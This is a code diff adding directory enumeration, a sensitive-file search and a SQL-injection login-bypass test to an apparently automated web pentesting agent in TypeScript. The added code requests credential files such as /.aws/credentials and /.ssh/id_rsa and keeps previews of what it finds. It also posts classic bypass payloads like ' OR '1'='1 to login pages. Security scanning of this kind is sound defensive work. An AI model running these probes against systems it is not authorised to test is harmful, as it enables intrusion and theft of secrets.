@@ -25,6 +25,9 @@ export class WebAppAgent extends BaseAgent {
       await this.testXSS(context, url)
       await this.testCSRF(context, url)
       await this.testSSL(context, url)
+      await this.testDirectoryEnumeration(context, url)
+      await this.testSensitiveFiles(context, url)
+      await this.testAuthenticationBypass(context, url)
 
       await this.log(context, 'Web application test completed', 'completed')
     } catch (error) {
@@ -415,6 +418,185 @@ export class WebAppAgent extends BaseAgent {
       await this.log(context, 'SSL/TLS test completed', 'completed')
     } catch (error) {
       await this.log(context, `SSL test error: ${error}`, 'error')
+    }
+  }
+
+  private async testDirectoryEnumeration(context: AgentContext, url: string) {
+    await this.log(context, 'Testing for common directories and endpoints', 'running')
+
+    const commonDirectories = [
+      '/admin', '/administrator', '/wp-admin', '/phpmyadmin',
+      '/backup', '/backups', '/old', '/test', '/dev', '/staging',
+      '/api', '/rest', '/graphql', '/swagger', '/docs',
+      '/.git', '/.svn', '/.env', '/config', '/uploads'
+    ]
+
+    let foundDirectories = 0
+
+    for (const dir of commonDirectories) {
+      try {
+        const testUrl = new URL(url)
+        testUrl.pathname = dir
+        
+        const response = await axios.get(testUrl.toString(), {
+          timeout: 5000,
+          validateStatus: () => true,
+          maxRedirects: 0
+        })
+
+        if (response.status === 200 || response.status === 301 || response.status === 302) {
+          foundDirectories++
+          
+          let severity: 'critical' | 'high' | 'medium' | 'low' = 'medium'
+          if (dir.includes('admin') || dir.includes('.git') || dir.includes('.env')) {
+            severity = 'critical'
+          } else if (dir.includes('backup') || dir.includes('config')) {
+            severity = 'high'
+          }
+
+          await this.reportFinding(context, {
+            title: `Exposed Directory: ${dir}`,
+            description: `Found publicly accessible directory at ${dir}. Status: ${response.status}`,
+            severity,
+            affected_asset: testUrl.toString(),
+            evidence: {
+              path: dir,
+              status_code: response.status,
+              content_type: response.headers['content-type']
+            },
+            cwe_id: 'CWE-200'
+          })
+        }
+      } catch (error) {
+        // Directory not found or error, continue
+      }
+    }
+
+    await this.log(context, `Directory enumeration completed. Found ${foundDirectories} accessible directories`, 'completed')
+  }
+
+  private async testSensitiveFiles(context: AgentContext, url: string) {
+    await this.log(context, 'Searching for sensitive files', 'running')
+
+    const sensitiveFiles = [
+      '/.env', '/.env.local', '/.env.production',
+      '/config.php', '/config.yml', '/database.yml',
+      '/backup.sql', '/dump.sql', '/database.sql',
+      '/phpinfo.php', '/info.php',
+      '/.git/config', '/.git/HEAD',
+      '/composer.json', '/package.json', '/yarn.lock',
+      '/.aws/credentials', '/.ssh/id_rsa',
+      '/web.config', '/WEB-INF/web.xml'
+    ]
+
+    let foundFiles = 0
+
+    for (const file of sensitiveFiles) {
+      try {
+        const testUrl = new URL(url)
+        testUrl.pathname = file
+        
+        const response = await axios.get(testUrl.toString(), {
+          timeout: 5000,
+          validateStatus: () => true,
+          maxRedirects: 0
+        })
+
+        if (response.status === 200 && response.data) {
+          foundFiles++
+          
+          await this.reportFinding(context, {
+            title: `Sensitive File Exposed: ${file}`,
+            description: `Found sensitive file at ${file} that should not be publicly accessible.`,
+            severity: 'critical',
+            affected_asset: testUrl.toString(),
+            evidence: {
+              file: file,
+              status_code: response.status,
+              content_length: response.data.length,
+              preview: response.data.substring(0, 200)
+            },
+            cwe_id: 'CWE-200',
+            cvss_score: 9.1
+          })
+        }
+      } catch (error) {
+        // File not found, continue
+      }
+    }
+
+    await this.log(context, `Sensitive file search completed. Found ${foundFiles} exposed files`, 'completed')
+  }
+
+  private async testAuthenticationBypass(context: AgentContext, url: string) {
+    await this.log(context, 'Testing for authentication bypass vulnerabilities', 'running')
+
+    try {
+      // Test for SQL injection in login
+      const loginPaths = ['/login', '/signin', '/auth', '/admin/login']
+      
+      for (const path of loginPaths) {
+        try {
+          const testUrl = new URL(url)
+          testUrl.pathname = path
+          
+          // Check if login page exists
+          const pageResponse = await axios.get(testUrl.toString(), {
+            timeout: 5000,
+            validateStatus: () => true
+          })
+
+          if (pageResponse.status === 200) {
+            // Try SQL injection bypass
+            const sqlBypass = [
+              "' OR '1'='1",
+              "admin'--",
+              "' OR 1=1--"
+            ]
+
+            for (const payload of sqlBypass) {
+              try {
+                const response = await axios.post(testUrl.toString(), {
+                  username: payload,
+                  password: payload
+                }, {
+                  timeout: 5000,
+                  validateStatus: () => true,
+                  maxRedirects: 0
+                })
+
+                // Check if bypass was successful (redirect or success status)
+                if (response.status === 302 || response.status === 200) {
+                  const locationHeader = response.headers['location']
+                  if (locationHeader && !locationHeader.includes('login') && !locationHeader.includes('error')) {
+                    await this.reportFinding(context, {
+                      title: 'SQL Injection Authentication Bypass',
+                      description: `Authentication can be bypassed using SQL injection payload: ${payload}`,
+                      severity: 'critical',
+                      affected_asset: testUrl.toString(),
+                      evidence: {
+                        payload: payload,
+                        response_status: response.status,
+                        redirect_location: locationHeader
+                      },
+                      cwe_id: 'CWE-89',
+                      cvss_score: 9.8
+                    })
+                  }
+                }
+              } catch (error) {
+                // Error on injection attempt, continue
+              }
+            }
+          }
+        } catch (error) {
+          // Login path doesn't exist, continue
+        }
+      }
+
+      await this.log(context, 'Authentication bypass testing completed', 'completed')
+    } catch (error) {
+      await this.log(context, `Authentication bypass test error: ${error}`, 'error')
     }
   }
 }
